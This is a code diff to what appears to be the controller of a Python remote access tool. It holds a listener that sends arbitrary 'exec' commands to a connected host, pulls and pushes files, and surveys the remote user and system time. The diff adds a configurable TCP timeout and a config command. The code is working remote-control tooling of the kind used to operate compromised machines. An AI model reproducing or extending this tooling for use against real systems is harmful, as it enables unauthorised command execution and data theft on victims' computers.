@@ -20,6 +20,7 @@ DEBUG = True
 CURRENT_WORKING_DIR = ""
 TASK_FILES_LOCATION = "tasks"
 CONNECTED_HOST = None
+CONFIG = {"TCP_TIMEOUT": 3}
 #IGNORE SSL CHECKS
 
 try:
@@ -134,7 +135,10 @@ def send_data(s, plain_text):
 
 def file_transfer_get(conn, filename):      #get file from server
     send_data(conn,"[transfer]")
+    filesize = conn.recv(128).decode()
+    print("total size:",filesize)
     bytes_read = conn.recv(128)
+    
     try:
         with open(filename, "wb") as f:
             while bytes_read != b"[END]":
@@ -166,6 +170,7 @@ def file_transfer_put(conn, commands):       #push file to server
     f.close()
 
 def listen_for_data(conn, mode="print",encoding="b64"):
+    conn.settimeout(CONFIG['TCP_TIMEOUT'])
     try:
         if DEBUG:
             print_info("Waiting for data...")
@@ -177,7 +182,7 @@ def listen_for_data(conn, mode="print",encoding="b64"):
         else:
             recv_total = recv_data
         while '[END]' not in recv_total:
-            print(f"Received: {recv_total}")              
+            #print(f"Received: {recv_total}\n-----------------")              
             if encoding == "b64":
                 recv_total = recv_total + base64_decode(recv_data)
             else:
@@ -187,6 +192,8 @@ def listen_for_data(conn, mode="print",encoding="b64"):
             return recv_total[:-5]
         else:
             print(recv_total[:-5])
+    except socket.timeout:
+        print(recv_total[:-5])
     except Exception as e:
         print(exc_info())
         print(e)
@@ -257,7 +264,6 @@ def run_initial_survey(conn):
     print("System Time: " + time)
     print("Username: " + username)
     print(RSTCOLORS)
-    print()
 
 def get_time(conn):
     if DEBUG:
@@ -292,6 +298,17 @@ def change_working_dir(conn, path):
     global CURRENT_WORKING_DIR
     send_data(conn, "[cwd] {}".format(path))
     CURRENT_WORKING_DIR = listen_for_data(conn,'store')
+
+def set_variables(cmd):
+    global CONFIG
+    variable = cmd.split("=")[0]
+    param = cmd.split("=")[1]
+    if variable == "timeout":
+        CONFIG['TCP_TIMEOUT'] = int(param)
+        print_good(f"New TCP Timeout Value: {CONFIG['TCP_TIMEOUT']}")
+
+def print_config():
+    print(CONFIG)
 
 def listen():
     global conn
@@ -519,9 +536,15 @@ def listen():
                         cmd = ""
                 elif cmd == "":
                     pass
+                elif "=" in cmd:
+                    set_variables(cmd)
+                    cmd = ""
+                elif cmd.lower() == "print config":
+                    print_config()
+                    cmd = ""
                 elif cmd.split()[0] == "exec":
                     data = ""
-                    new_cmd = cmd.replace("exec ","")
+                    new_cmd = cmd[5:]
                     send_data(conn, new_cmd)
                     #print_info("Sent:\n"+command)
                     listen_for_data(conn,'print')
